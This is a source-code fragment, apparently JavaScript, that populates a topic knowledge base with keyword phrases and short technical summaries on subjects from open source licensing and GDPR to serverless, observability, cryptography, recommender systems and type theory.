  // ── Open Source / Community ─────────────────────────────────────────────────
  add('open_source', ['open source license mit gpl apache bsd mozilla', 'software licensing permissive copyleft choosing license', 'license compatibility gpl mit apache linking distribution'],
    'Open source licensing: Permissive — MIT (minimal restrictions, most popular), Apache 2.0 (patent grant, attribution), BSD (2/3-clause, similar to MIT), ISC (simplified MIT). Copyleft — GPL v2/v3 (derivatives must be GPL, "viral"), LGPL (library exception, can link without GPL obligation), AGPL (network use triggers copyleft), MPL 2.0 (file-level copyleft). Choosing: permissive for libraries/adoption, copyleft for community protection. License compatibility: Apache 2.0 compatible with GPLv3 but not GPLv2. SPDX identifiers for machine-readable license references. Dual licensing: open source + commercial.', 1.0)

  add('open_source', ['semantic versioning semver major minor patch version', 'changelog keep changelog conventional commits release', 'version management npm version git tag release notes'],
    'Versioning & releases: Semantic Versioning (SemVer) — MAJOR.MINOR.PATCH. MAJOR: breaking changes, MINOR: backward-compatible features, PATCH: backward-compatible fixes. Pre-release: 1.0.0-alpha.1, 1.0.0-beta.2, 1.0.0-rc.1. Conventional Commits: type(scope): description — feat:, fix:, docs:, chore:, BREAKING CHANGE:. Auto-changelog: conventional-changelog, release-please, semantic-release. Release process: version bump, changelog update, git tag, GitHub Release, package publish. Calver (calendar versioning): YYYY.MM.DD — used by Ubuntu, pip.', 1.0)

  add('open_source', ['contributing guide code of conduct community guidelines', 'pull request template issue template good first issue', 'open source maintainer community management governance'],
    'Community management: CONTRIBUTING.md — development setup, coding standards, PR process, issue triaging, communication channels. CODE_OF_CONDUCT.md — Contributor Covenant (most common), enforcement guidelines. Issue templates: bug report, feature request, question. PR templates: description, related issues, testing, screenshots. Labels: good first issue, help wanted, bug, enhancement, documentation. Governance models: BDFL (Benevolent Dictator for Life), meritocracy, foundation-backed (Apache, Linux Foundation, CNCF). Maintainer burnout: set boundaries, delegate, use bots (Dependabot, Stale bot).', 1.0)

  add('open_source', ['github actions ci cd open source workflow automation', 'package publishing npm pypi crates rubygems registry', 'open source security vulnerability disclosure responsible'],
    'Open source operations: CI/CD — GitHub Actions (free for public repos), GitLab CI, CircleCI. Workflows: lint, test, build, release, publish. Package registries: npm (JavaScript), PyPI (Python), crates.io (Rust), RubyGems (Ruby), Maven Central (Java), NuGet (.NET). Publishing: automated with CI, provenance/attestation for supply chain security. Security: SECURITY.md with vulnerability disclosure policy, responsible disclosure, CVE reporting, GitHub Security Advisories. Supply chain: Sigstore for signing, SBOM (Software Bill of Materials), dependency scanning (Dependabot, Snyk, Socket).', 0.9)

  add('open_source', ['open source funding sponsorship sustainability model', 'open source contribution forking upstream downstream', 'inner source enterprise open source practices internal'],
    'Sustainability & contribution: Funding — GitHub Sponsors, Open Collective, Tidelift, grants (Google Summer of Code, Linux Foundation). Business models: open core, SaaS/hosting, support/consulting, dual licensing. Contributing workflow: fork → clone → branch → commit → push → PR. Upstream/downstream: upstream (original project), downstream (consumers/forks). Cherry-picking patches upstream. InnerSource: applying open source practices inside organizations — discoverable repos, contributing guidelines, internal communities. Metrics: contributors, commit frequency, issue response time, bus factor.', 0.9)

  // ── Privacy Engineering / GDPR ──────────────────────────────────────────────
  add('privacy_engineering', ['gdpr general data protection regulation european privacy', 'data protection regulation compliance personal data processing', 'gdpr principles lawfulness purpose limitation data minimization'],
    'GDPR fundamentals: General Data Protection Regulation (EU, 2018) — applies to processing personal data of EU residents. 7 principles: lawfulness/fairness/transparency, purpose limitation, data minimization, accuracy, storage limitation, integrity/confidentiality, accountability. Lawful bases: consent, contract, legal obligation, vital interests, public task, legitimate interests. Rights: access (Art.15), rectification (Art.16), erasure "right to be forgotten" (Art.17), portability (Art.20), objection (Art.21). Fines: up to €20M or 4% global turnover. DPA (Data Protection Authority) per EU member state.', 1.1)

  add('privacy_engineering', ['consent management platform cmp cookie banner opt in', 'privacy by design default data protection impact assessment', 'dpia data protection impact assessment risk evaluation'],
    'Privacy by design & consent: Privacy by Design (PbD) — 7 foundational principles: proactive, default privacy, embedded, full functionality, end-to-end security, visibility/transparency, user-centric. Data Protection Impact Assessment (DPIA) — required for high-risk processing: systematic description, necessity/proportionality, risk assessment, mitigation measures. Consent Management Platforms (CMPs): OneTrust, Cookiebot, Usercentrics. Cookie consent: strictly necessary (no consent needed), analytics (opt-in), marketing (opt-in). Consent requirements: freely given, specific, informed, unambiguous, withdrawable.', 1.0)

  add('privacy_engineering', ['pii personally identifiable information detection classification', 'data anonymization pseudonymization differential privacy', 'data masking tokenization encryption at rest in transit'],
    'PII handling & anonymization: PII categories — direct identifiers (name, SSN, email), quasi-identifiers (age, ZIP, gender — can re-identify when combined). Detection: regex patterns, ML classifiers, DLP (Data Loss Prevention) tools. Anonymization techniques: k-anonymity (each record indistinguishable from k-1 others), l-diversity (sensitive attribute diversity), t-closeness. Pseudonymization: replace identifiers with tokens (reversible with key). Differential privacy: add calibrated noise to query results (ε-differential privacy). Data masking: static (permanent), dynamic (at query time). Encryption: at rest (AES-256), in transit (TLS 1.3).', 1.0)

  add('privacy_engineering', ['right to erasure deletion data subject request dsar', 'data retention policy lifecycle management purging', 'cross border data transfer adequacy decision standard clauses'],
    'Data subject rights & transfers: DSAR (Data Subject Access Request) — organizations must respond within 30 days. Right to erasure: delete personal data when no longer necessary, consent withdrawn, or unlawful processing. Challenges: backups, distributed systems, derived data, third-party copies. Data retention: define policies per data category, automated purging, legal hold exceptions. Cross-border transfers: adequacy decisions (EU Commission approves country), Standard Contractual Clauses (SCCs), Binding Corporate Rules (BCRs). US: no federal privacy law — state-level (CCPA/CPRA California, VCDPA Virginia, CPA Colorado).', 1.0)

  add('privacy_engineering', ['ccpa california consumer privacy act cpra rights', 'privacy engineering tools onetrust bigid securiti', 'data breach notification incident response gdpr 72 hours'],
    'CCPA/CPRA & breach response: CCPA/CPRA (California) — right to know, delete, opt-out of sale, non-discrimination. Categories: personal information, sensitive personal information. Global Privacy Control (GPC) signal for opt-out. Privacy tools: OneTrust (compliance platform), BigID (data discovery/classification), Securiti (privacy automation), Transcend (data mapping). Breach notification: GDPR requires 72-hour notification to DPA, "without undue delay" to data subjects if high risk. CCPA: notification without unreasonable delay. Incident response: contain, assess scope, notify, remediate, document lessons learned.', 1.0)

  // ── Edge Computing / Serverless ──────────────────────────────────────────────
  add('edge_serverless', ['aws lambda serverless function event driven cold start', 'lambda function handler runtime timeout memory', 'serverless framework sam cdk deployment infrastructure'],
    'AWS Lambda & Serverless: Event-driven compute — functions triggered by API Gateway, S3, SQS, DynamoDB Streams, EventBridge. Runtimes: Node.js, Python, Java, Go, .NET, Ruby, custom (container images). Limits: 15min timeout, 10GB memory, 6MB payload (sync), 256KB (async). Cold starts: first invocation latency (Java/C# worst, Python/Node best). Mitigation: provisioned concurrency, SnapStart (Java), smaller packages, keep-alive pings. Frameworks: Serverless Framework (multi-cloud), AWS SAM (CloudFormation), SST (TypeScript), Architect.', 1.1)

  add('edge_serverless', ['cloudflare workers edge function v8 isolate wasm', 'vercel edge functions nextjs middleware runtime', 'deno deploy edge runtime bun serverless'],
    'Edge computing platforms: Cloudflare Workers — V8 isolates (not containers), <1ms cold starts, 128MB memory, Workers KV (key-value), Durable Objects (stateful), R2 (S3-compatible storage), D1 (SQLite at edge). Vercel Edge Functions — built on Edge Runtime, integrate with Next.js middleware, streaming responses. Deno Deploy — TypeScript-native edge runtime, built-in KV, BroadcastChannel. Bun — fast JavaScript runtime with serverless support. Fastly Compute@Edge — WASM-based edge compute. Use cases: A/B testing, geolocation routing, auth at edge, personalization, bot protection.', 1.0)

  add('edge_serverless', ['edge caching cdn worker global distribution latency', 'serverless database planetscale neon turso supabase', 'function as a service faas event driven architecture'],
    'Edge architecture patterns: Edge caching — cache API responses at CDN edge (Cache-Control, stale-while-revalidate), Cloudflare Cache API, Vercel ISR (Incremental Static Regeneration). Serverless databases: PlanetScale (MySQL, branching), Neon (Postgres, branching, autoscaling), Turso (SQLite/libSQL, edge replicas), Supabase (Postgres, real-time, auth). FaaS patterns: single-purpose functions, event-driven (pub/sub, queues), fan-out/fan-in, saga pattern for distributed transactions. Cost model: pay-per-invocation (no idle cost), but watch for runaway executions.', 1.0)

  add('edge_serverless', ['step functions orchestration state machine serverless', 'serverless monitoring observability cold start optimization', 'api gateway websocket serverless http endpoint'],
    'Serverless orchestration & monitoring: AWS Step Functions — state machines for serverless workflows (sequential, parallel, choice, wait, error handling). Express Workflows for high-volume short-duration. Standard for long-running. Monitoring: AWS X-Ray, Lumigo, Dashbird, Epsagon for distributed tracing. Cold start optimization: tree-shaking, lazy imports, connection pooling (RDS Proxy), provisioned concurrency. API Gateway: REST API, HTTP API (cheaper, faster), WebSocket API. Authentication: Lambda authorizers, Cognito, JWT verification at edge.', 1.0)

  // ── Low-Code / No-Code ─────────────────────────────────────────────────────
  add('low_code', ['retool internal tool builder admin panel dashboard', 'low code platform appsmith tooljet budibase', 'visual programming drag drop component builder'],
    'Low-code internal tools: Retool — drag-and-drop UI builder for internal tools, connects to databases/APIs, JavaScript transformers, role-based access. Alternatives: Appsmith (open-source), ToolJet (open-source), Budibase (open-source, self-hostable). Visual programming: component-based UIs, form builders, table/chart widgets, workflow triggers. Use cases: admin panels, CRUD apps, data dashboards, customer support tools, approval workflows. Advantages: 10x faster development for internal tools, non-engineers can maintain.', 1.0)

  add('low_code', ['zapier automation workflow trigger action integration', 'n8n make integromat workflow automation self hosted', 'ifttt webhook api connector no code automation'],
    'Workflow automation: Zapier — connect 5000+ apps with triggers and actions, multi-step Zaps, filters, formatters, paths (conditional logic). Make (formerly Integromat) — visual scenarios, more complex logic, HTTP modules. n8n — open-source, self-hostable, code nodes (JavaScript/Python), AI agents. IFTTT — simple if-this-then-that consumer automations. Patterns: webhook triggers, scheduled runs, email parsing, form submission processing, CRM sync, invoice automation. Limitations: API rate limits, execution time limits, data transformation complexity.', 1.0)

  add('low_code', ['airtable notion database spreadsheet knowledge base', 'no code website builder webflow bubble squarespace', 'citizen developer low code governance shadow it'],
    'No-code platforms: Airtable — spreadsheet-database hybrid, views (grid, kanban, calendar, gallery), automations, scripting. Notion — docs + databases + wikis, API, templates. Website builders: Webflow (professional CSS control, CMS, hosting), Bubble (full-stack web apps, workflows, database), Squarespace (templates, e-commerce). Citizen developers: business users building solutions. Governance: shadow IT risks, data security, integration standards, approved platform list. Best for: MVPs, prototypes, internal tools, landing pages, simple CRUD apps. Not for: high-scale, complex algorithms, real-time systems.', 1.0)

  // ── Infrastructure as Code (IaC) ───────────────────────────────────────────
  add('iac', ['terraform infrastructure as code hcl provider resource', 'terraform state management backend remote locking', 'terraform module registry reusable configuration'],
    'Terraform: HashiCorp IaC tool — declarative HCL (HashiCorp Configuration Language). Core concepts: providers (AWS, GCP, Azure, 3000+), resources (infrastructure components), data sources (read existing), modules (reusable configs). State management: terraform.tfstate tracks real infrastructure. Remote backends: S3+DynamoDB (locking), Terraform Cloud, GCS. Workflow: terraform init → plan → apply → destroy. State locking prevents concurrent modifications. Modules: reuse via Terraform Registry or private. Best practices: remote state, workspace per environment, module versioning, plan review before apply.', 1.1)

  add('iac', ['pulumi aws cdk infrastructure code typescript python', 'ansible configuration management playbook role inventory', 'crossplane kubernetes native infrastructure control plane'],
    'IaC alternatives: Pulumi — real programming languages (TypeScript, Python, Go, C#) instead of DSL. State management, preview, policy-as-code. AWS CDK — define AWS infra in TypeScript/Python/Java, synthesizes to CloudFormation. Constructs (L1=CFN, L2=opinionated, L3=patterns). Ansible — configuration management, agentless (SSH), playbooks (YAML), roles, inventory, idempotent modules. Not strictly IaC but overlaps. Crossplane — Kubernetes-native IaC, manage cloud resources via K8s CRDs. Chef/Puppet — older CM tools, agent-based.', 1.0)

  add('iac', ['infrastructure drift detection remediation compliance', 'gitops flux argocd infrastructure repository reconciliation', 'iac testing terratest checkov tfsec policy compliance'],
    'IaC operations: Drift detection — compare declared state vs actual infrastructure, tools: terraform plan, driftctl, CloudQuery. Remediation: auto-apply or alert. GitOps: infrastructure changes through Git PRs — ArgoCD, Flux for Kubernetes, Atlantis for Terraform. Repository structure: mono-repo vs poly-repo, environment branches vs directories. Testing: Terratest (Go, integration tests), Checkov (policy-as-code, security scanning), tfsec (Terraform security), OPA (Open Policy Agent) for custom policies. Compliance: CIS benchmarks, SOC2, HIPAA infrastructure requirements. Secrets: Vault, AWS Secrets Manager, SOPS.', 1.0)

  // ── Observability / Monitoring ──────────────────────────────────────────────
  add('observability', ['prometheus metrics scraping alertmanager grafana dashboard', 'time series database tsdb promql query recording rules', 'grafana dashboard visualization panel template variable'],
    'Prometheus & Grafana: Prometheus — pull-based metrics collection, time-series database (TSDB), PromQL query language. Metric types: counter (only increases), gauge (up/down), histogram (distribution), summary. AlertManager: alerting rules, routing, silencing, inhibition. Recording rules: pre-compute expensive queries. Grafana — visualization platform, dashboards, panels (graph, table, stat, gauge, heatmap), template variables, annotations. Data sources: Prometheus, Loki, Tempo, Elasticsearch, InfluxDB, PostgreSQL. Alerting: unified alerting across data sources.', 1.1)

  add('observability', ['opentelemetry otlp traces spans distributed tracing', 'jaeger zipkin tempo distributed trace collector', 'instrumentation sdk auto manual telemetry data'],
    'Distributed tracing: OpenTelemetry (OTel) — vendor-neutral observability framework. Three signals: traces, metrics, logs. OTLP protocol for data export. Traces: spans (operations) with parent-child relationships, attributes, events. Context propagation: W3C TraceContext, B3 headers. Auto-instrumentation: SDK injects tracing into HTTP clients, databases, frameworks. Backends: Jaeger (Uber, open-source), Tempo (Grafana, cost-effective), Zipkin (Twitter), AWS X-Ray, Datadog APM. Sampling: head-based (decision at start), tail-based (decision after completion, keeps interesting traces).', 1.0)

  add('observability', ['log aggregation elk elasticsearch loki fluentd', 'structured logging json correlation id context', 'datadog newrelic dynatrace apm commercial monitoring'],
    'Logging & APM: Log aggregation — ELK stack (Elasticsearch + Logstash + Kibana), Grafana Loki (label-based, cost-effective), Fluentd/Fluent Bit (log collection/forwarding). Structured logging: JSON format, correlation IDs for request tracing, log levels (DEBUG, INFO, WARN, ERROR). Best practices: structured > unstructured, include context (requestId, userId), don\'t log PII. Commercial APM: Datadog (unified platform, 700+ integrations), New Relic (full-stack observability), Dynatrace (AI-powered, auto-discovery). SLO-based alerting: alert on SLO burn rate, not individual metrics.', 1.0)

  add('observability', ['synthetic monitoring uptime health check endpoint', 'real user monitoring rum performance web vitals', 'alert routing escalation pagerduty opsgenie oncall'],
    'Monitoring patterns: Synthetic monitoring — automated checks from external locations (Pingdom, UptimeRobot, Checkly). Health check endpoints: /health, /readiness, /liveness for Kubernetes probes. Real User Monitoring (RUM): actual user experience data (page load, interactions, errors). Core Web Vitals monitoring. Error tracking: Sentry, Bugsnag, Rollbar — capture exceptions with stack traces, breadcrumbs, context. Alert routing: PagerDuty, OpsGenie — on-call schedules, escalation policies, incident management integration. Runbooks linked to alerts for quick resolution.', 1.0)

  // ── Digital Twins / Simulation ──────────────────────────────────────────────
  add('digital_twins', ['digital twin virtual model real time synchronization', 'physics simulation finite element analysis fem fea', 'agent based modeling simulation complex adaptive system'],
    'Digital twins & simulation: Digital twin — virtual replica of physical system, synchronized with real-time data (IoT sensors, APIs). Layers: physical entity, virtual model, data connection, analytics. Use cases: predictive maintenance (machinery), urban planning (city twins), healthcare (patient twins), manufacturing (production optimization). Physics simulation: Finite Element Analysis (FEA/FEM) — discretize continuous domain into elements, solve PDEs numerically. Tools: ANSYS, COMSOL, OpenFOAM (CFD). Agent-based modeling (ABM): autonomous agents with rules, emergent behavior. Tools: Mesa (Python), NetLogo, AnyLogic.', 1.0)

  add('digital_twins', ['monte carlo simulation random sampling probability', 'discrete event simulation queuing theory process', 'system dynamics feedback loop stock flow causal'],
    'Simulation methods: Monte Carlo — random sampling to estimate numerical results. Applications: risk analysis, financial modeling, physics, optimization. Convergence: accuracy improves with √N samples. Variance reduction: importance sampling, stratified sampling, antithetic variates. Discrete Event Simulation (DES): model systems as sequence of events (arrivals, departures, failures). Queuing theory: M/M/1, M/M/c models. Tools: SimPy (Python), Arena, Simio. System dynamics: stocks (accumulations), flows (rates), feedback loops (reinforcing/balancing). Causal loop diagrams. Tools: Vensim, Stella.', 1.0)

  add('digital_twins', ['computational fluid dynamics cfd weather climate', 'simulation optimization genetic algorithm parameter', 'real time simulation hardware in loop testing'],
    'Advanced simulation: CFD (Computational Fluid Dynamics) — Navier-Stokes equations, turbulence models (RANS, LES, DNS), mesh generation. Weather/climate modeling: GCMs (General Circulation Models), ensemble forecasting. Simulation optimization: use optimization algorithms (genetic, simulated annealing, Bayesian optimization) to find best parameters. Hardware-in-the-loop (HIL): real hardware + simulated environment for testing embedded systems, autonomous vehicles, aerospace. Digital twin platforms: Azure Digital Twins, AWS IoT TwinMaker, NVIDIA Omniverse. Standards: DTDL (Digital Twins Definition Language).', 1.0)

  // ── Natural Language Generation (NLG) ──────────────────────────────────────
  add('nlg', ['natural language generation template text production', 'text generation gpt language model autoregressive', 'nlg pipeline content determination document structuring'],
    'Natural Language Generation: NLG pipeline — content determination (what to say), document structuring (order), sentence aggregation (combine), lexicalization (word choice), referring expression generation (pronouns/names), linguistic realization (grammar). Template-based: fill slots in predefined templates (simple, predictable, limited). Rule-based: grammar rules generate varied output. Neural: GPT/LLM-based (fluent but less controlled). Hybrid: templates + neural for controlled yet natural output. Applications: report generation, data-to-text (sports summaries, financial reports), chatbot responses, personalized emails.', 1.0)

  add('nlg', ['text summarization extractive abstractive compression', 'paraphrasing sentence rewriting style transfer', 'grammar checking correction grammarly language tool'],
    'Text transformation: Summarization — extractive (select important sentences: TextRank, BERT-based) vs abstractive (generate new text: T5, BART, Pegasus). Compression ratio, ROUGE evaluation metrics. Paraphrasing: rephrase while preserving meaning — back-translation, T5 paraphrase models, round-trip translation. Style transfer: formal↔informal, technical↔simple, active↔passive. Grammar correction: rule-based (LanguageTool, open-source), neural (GECToR, T5), commercial (Grammarly). Readability metrics: Flesch-Kincaid, Gunning Fog, SMOG index. Plain language: short sentences, active voice, common words.', 1.0)

  add('nlg', ['dialogue system response generation chatbot conversational', 'data to text report generation automated narrative', 'content generation seo copywriting marketing automation'],
    'Applied NLG: Dialogue systems — retrieval-based (select from candidates), generative (create novel responses), hybrid. Persona consistency, grounding in knowledge. Data-to-text: convert structured data (tables, charts, databases) to natural language narratives. Automated reporting: financial summaries, sports recaps, weather reports, analytics dashboards. Tools: Narrative Science (acquired by Salesforce), Arria NLG, Amazon Polly (text-to-speech). Content generation: SEO-optimized articles, product descriptions, ad copy, email campaigns. Ethical considerations: disclosure of AI-generated content, misinformation risks, plagiarism detection.', 1.0)

  // ── Computer Vision & Image Processing ───────────────────────────────────────
  add('computer_vision', ['object detection recognition yolo ssd faster rcnn', 'image segmentation semantic instance panoptic mask', 'convolutional neural network cnn feature extraction'],
    'Computer Vision fundamentals: Object detection — localize and classify objects with bounding boxes. YOLO (You Only Look Once) real-time single-shot detector, SSD (Single Shot MultiBox Detector), Faster R-CNN two-stage detector (RPN + classification). Image segmentation: semantic (per-pixel class labels), instance (separate object instances), panoptic (unified semantic+instance). Architectures: U-Net (biomedical), Mask R-CNN (instance), DeepLab (atrous convolution). Feature extraction: CNNs (ResNet, VGG, EfficientNet), Vision Transformers (ViT, DeiT, Swin Transformer). Transfer learning: pretrained ImageNet models fine-tuned for domain tasks. Data augmentation: rotation, flipping, color jitter, CutOut, MixUp, CutMix.', 1.0)

  add('computer_vision', ['optical flow motion estimation video tracking surveillance', 'image enhancement restoration super resolution denoising', '3d vision depth estimation stereo point cloud lidar'],
    'Advanced CV: Optical flow — pixel-level motion between frames. Dense (Farneback, FlowNet, RAFT) vs sparse (Lucas-Kanade). Video tracking: SORT, DeepSORT, ByteTrack, multi-object tracking (MOT). Action recognition: I3D, SlowFast, TimeSFormer. Image enhancement: super-resolution (SRCNN, ESRGAN, Real-ESRGAN), denoising (DnCNN, noise2noise), dehazing, low-light enhancement. Image restoration: inpainting (fill missing regions), deblurring, artifact removal. 3D vision: depth estimation (monocular MiDaS, stereo matching), point cloud processing (PointNet, PointNet++), LiDAR processing, structure from motion (SfM), SLAM (simultaneous localization and mapping). Applications: autonomous driving, medical imaging, satellite imagery, manufacturing inspection.', 1.0)

  add('computer_vision', ['opencv image processing computer vision library', 'face detection recognition deepface arcface', 'ocr optical character recognition tesseract paddleocr'],
    'CV tools & applications: OpenCV — comprehensive open-source library for image processing, feature detection (SIFT, ORB, SURF), camera calibration, contour detection, morphological operations. Face processing: detection (MTCNN, RetinaFace), recognition (ArcFace, CosFace, DeepFace), landmark detection (dlib, MediaPipe), face alignment, anti-spoofing. OCR: Tesseract (open-source), PaddleOCR, EasyOCR, scene text detection (EAST, CRAFT). Document AI: layout analysis, table extraction, form parsing. Pose estimation: body (OpenPose, MediaPipe), hand, full-body mesh (SMPL). Visual SLAM: ORB-SLAM, LSD-SLAM. Edge deployment: TensorRT, ONNX Runtime, OpenVINO, TFLite.', 1.0)

  // ── Cryptography & Applied Security ──────────────────────────────────────────
  add('cryptography', ['symmetric encryption aes des block cipher stream cipher', 'public key cryptography rsa elliptic curve diffie hellman', 'hash function sha256 md5 hmac message authentication code'],
    'Cryptography fundamentals: Symmetric encryption — same key for encrypt/decrypt. Block ciphers: AES (128/192/256-bit, CBC/CTR/GCM modes), DES/3DES (legacy). Stream ciphers: ChaCha20, RC4 (deprecated). Key management: key derivation (PBKDF2, bcrypt, scrypt, Argon2), key rotation, key escrow. Asymmetric/public-key: RSA (2048+ bits), Elliptic Curve (ECDSA, Ed25519, Curve25519), Diffie-Hellman key exchange (DH, ECDH). Digital signatures: sign with private key, verify with public. PKI: certificates (X.509), certificate authorities (CA), certificate chains, revocation (CRL, OCSP). Hash functions: SHA-256, SHA-3, BLAKE2, BLAKE3. MACs: HMAC, CMAC, Poly1305. Collision resistance, preimage resistance.', 1.0)

  add('cryptography', ['tls ssl https certificate transport layer security', 'post quantum cryptography lattice based ntru kyber dilithium', 'zero knowledge proof zkp zk snark zk stark'],
    'Applied cryptography: TLS/SSL — TLS 1.3 (simplified handshake, forward secrecy), cipher suites, certificate pinning, mTLS (mutual TLS). Post-quantum cryptography: NIST PQC standards — CRYSTALS-Kyber (key encapsulation), CRYSTALS-Dilithium (signatures), FALCON (signatures), SPHINCS+ (hash-based signatures). Lattice-based, code-based, hash-based, isogeny-based approaches. Quantum threat: Shor\'s algorithm breaks RSA/ECC, Grover\'s weakens symmetric. Zero-knowledge proofs: prove statement truth without revealing info. zk-SNARKs (succinct, non-interactive), zk-STARKs (transparent, scalable). Homomorphic encryption: compute on encrypted data (fully: TFHE, BFV; partially: Paillier). Secure multi-party computation (MPC). Secret sharing (Shamir). Applications: privacy-preserving ML, anonymous credentials, blockchain privacy.', 1.0)

  // ── Recommendation Systems & Personalization ─────────────────────────────────
  add('recommendation_systems', ['collaborative filtering user item matrix factorization', 'content based filtering feature similarity cosine tf idf', 'recommendation system personalization engine'],
    'Recommendation Systems: Collaborative filtering — user-based (find similar users, recommend their items) vs item-based (find similar items to user\'s history). Matrix factorization: SVD, NMF, ALS. Implicit feedback: clicks, views, dwell time vs explicit ratings. Cold-start problem: new users/items with no history. Content-based: item features (TF-IDF, embeddings), user profile matching, cosine similarity. Hybrid approaches: weighted, switching, cascade, feature augmentation. Knowledge-based: constraint-based (user requirements) and case-based (similarity to past cases). Evaluation: precision@K, recall@K, NDCG, MAP, hit rate, coverage, diversity, serendipity. A/B testing for recommenders.', 1.0)

  add('recommendation_systems', ['deep learning recommendation neural collaborative ncf', 'session based recommendation sequential gru4rec', 'multi armed bandit exploration exploitation thompson sampling'],
    'Advanced recommenders: Deep learning approaches — Neural Collaborative Filtering (NCF), DeepFM, Wide & Deep, DLRM (Deep Learning Recommendation Model). Embedding-based: item2vec, user/item embeddings. Two-tower models for retrieval. Sequential/session-based: GRU4Rec, SASRec, BERT4Rec — model temporal patterns, next-item prediction. Multi-armed bandits: exploration vs exploitation tradeoff. Thompson sampling, UCB (Upper Confidence Bound), epsilon-greedy, contextual bandits (LinUCB). Explainable recommendations: attention weights, knowledge graph paths, counterfactual explanations. Feature stores: real-time feature serving (Feast, Tecton). Production systems: candidate generation → ranking → re-ranking pipeline. Bias mitigation: popularity bias, position bias, fairness constraints.', 1.0)

  // ── Data Visualization & Dashboarding ────────────────────────────────────────
  add('data_visualization', ['data visualization chart bar line scatter pie heatmap', 'dashboard design layout tableau power bi grafana', 'd3 js plotly matplotlib seaborn vega lite'],
    'Data Visualization: Chart types — bar (comparison), line (trend), scatter (correlation), pie (composition), heatmap (matrix), treemap (hierarchy), sankey (flow), box plot (distribution), violin (density). Grammar of Graphics (Leland Wilkinson): data, aesthetics, geometries, facets, statistics, coordinates, themes. Tools: D3.js (low-level, web), Plotly (interactive, multi-language), Matplotlib/Seaborn (Python), Vega-Lite (declarative), Chart.js, ECharts, Highcharts. Dashboard platforms: Tableau, Power BI, Grafana, Looker, Metabase, Apache Superset. Design principles: data-ink ratio (Tufte), pre-attentive attributes, Gestalt principles, color theory (sequential, diverging, categorical palettes). Responsive design for dashboards.', 1.0)

  add('data_visualization', ['interactive visualization brushing linking zoom filter', 'geospatial visualization map choropleth leaflet mapbox', 'storytelling with data narrative annotation'],
    'Advanced visualization: Interactive techniques — brushing & linking (coordinate multiple views), zooming & panning, filtering, tooltips, drill-down. Geospatial: choropleth maps, point maps, flow maps, cartograms. Tools: Leaflet, Mapbox GL JS, Kepler.gl, deck.gl, Folium. Storytelling with data: annotation layers, progressive disclosure (scrollytelling), narrative structure (setup-tension-resolution). Accessibility: colorblind-safe palettes (viridis, cividis), alt text for charts, screen reader compatibility, high contrast modes. Large data: aggregation, sampling, WebGL rendering (deck.gl, regl), server-side rendering. Real-time dashboards: streaming updates, WebSocket integration, time-window aggregation.', 1.0)

  // ── Event-Driven Architecture & Messaging ────────────────────────────────────
  add('event_driven', ['event driven architecture eda event bus event emitter', 'message broker kafka rabbitmq activemq pulsar nats', 'event sourcing cqrs command query responsibility segregation'],
    'Event-Driven Architecture: Core concepts — events (immutable facts), commands (requests), queries (reads). Patterns: event notification, event-carried state transfer, event sourcing, CQRS. Message brokers: Apache Kafka (distributed log, partitions, consumer groups, exactly-once), RabbitMQ (AMQP, exchanges, queues, routing), Apache Pulsar (multi-tenant, tiered storage), NATS (lightweight, JetStream), Amazon SQS/SNS, Azure Service Bus. Event sourcing: persist all state changes as events, rebuild state by replaying. Benefits: audit trail, temporal queries, debugging. CQRS: separate read/write models, optimized independently. Event schemas: Avro, Protobuf, JSON Schema. Schema registry (Confluent, Apicurio).', 1.0)

  add('event_driven', ['saga pattern choreography orchestration distributed transaction', 'pub sub publish subscribe topic fan out', 'dead letter queue dlq retry backoff idempotency'],
    'EDA patterns: Saga pattern — manage distributed transactions across microservices. Choreography (event-based, decentralized) vs orchestration (central coordinator). Compensating transactions for rollback. Pub/Sub: publishers emit events to topics, subscribers consume asynchronously. Fan-out: one event to many consumers. Fan-in: many events to one processor. Reliability: at-least-once, at-most-once, exactly-once delivery guarantees. Dead letter queues (DLQ): capture failed messages for analysis/retry. Retry strategies: exponential backoff, jitter, circuit breaker. Idempotency: design consumers to handle duplicate events safely (idempotency keys). Event ordering: partition-based ordering (Kafka), sequence numbers. Eventual consistency patterns. Outbox pattern: reliable event publishing with transactional outbox.', 1.0)

  // ── Real-Time Systems & Streaming ────────────────────────────────────────────
  add('realtime_systems', ['real time system streaming data pipeline', 'stream processing apache kafka flink spark streaming', 'websocket server sent events sse real time communication'],
    'Real-Time Systems: Stream processing engines — Apache Flink (stateful, exactly-once, event-time), Apache Kafka Streams (lightweight, embedded), Spark Structured Streaming (micro-batch, unified batch/stream), Apache Storm (original stream processor). Windowing: tumbling, sliding, session, global windows. Watermarks for handling late data. State management: RocksDB, checkpointing, savepoints. WebSocket: full-duplex, persistent connection, binary/text frames. Server-Sent Events (SSE): server-to-client, auto-reconnect, event IDs. Long polling (fallback). gRPC streaming: unary, server, client, bidirectional. MQTT for IoT real-time. Real-time databases: Firebase Realtime DB, Supabase, RethinkDB changefeeds.', 1.0)

  add('realtime_systems', ['low latency networking kernel bypass dpdk', 'clock synchronization ntp ptp vector clock lamport', 'backpressure flow control rate limiting throttle'],
    'Advanced real-time: Low-latency networking — kernel bypass (DPDK, io_uring, XDP/eBPF), zero-copy, RDMA, user-space networking. TCP tuning: Nagle algorithm, TCP_NODELAY, buffer sizes. UDP for latency-critical (QUIC, game networking). Clock synchronization: NTP (millisecond accuracy), PTP/IEEE 1588 (microsecond), GPS-based. Logical clocks: Lamport timestamps, vector clocks, hybrid logical clocks (HLC). Ordering guarantees: total order, causal order, FIFO. Backpressure: reactive streams (Publisher/Subscriber/Processor), flow control (TCP window, credit-based), rate limiting (token bucket, leaky bucket, sliding window). Circuit breaker pattern for cascading failure prevention. Real-time analytics: OLAP cubes, pre-aggregation, approximate algorithms (HyperLogLog, Count-Min Sketch, t-digest).', 1.0)

  // ── Type Theory & Formal Methods ─────────────────────────────────────────────
  add('type_theory', ['type theory dependent type linear type refinement type', 'model checking temporal logic ltl ctl spin nusmv', 'theorem prover proof assistant coq agda lean idris'],
    'Type Theory & Formal Methods: Type systems — simple types, polymorphism (parametric, ad-hoc), dependent types (types depend on values: Coq, Agda, Idris, Lean). Linear types (use exactly once: Rust ownership, Clean). Refinement types (types with predicates: Liquid Haskell, F*). Effect systems: track side effects in types. Model checking: automatically verify finite-state systems against temporal logic specifications. LTL (Linear Temporal Logic), CTL (Computation Tree Logic). Tools: SPIN (Promela), NuSMV, TLA+ (Lamport). Theorem provers: Coq (Gallina, tactics), Lean 4 (Mathlib), Agda (dependently typed), Isabelle/HOL. Curry-Howard correspondence: proofs as programs, types as propositions.', 1.0)

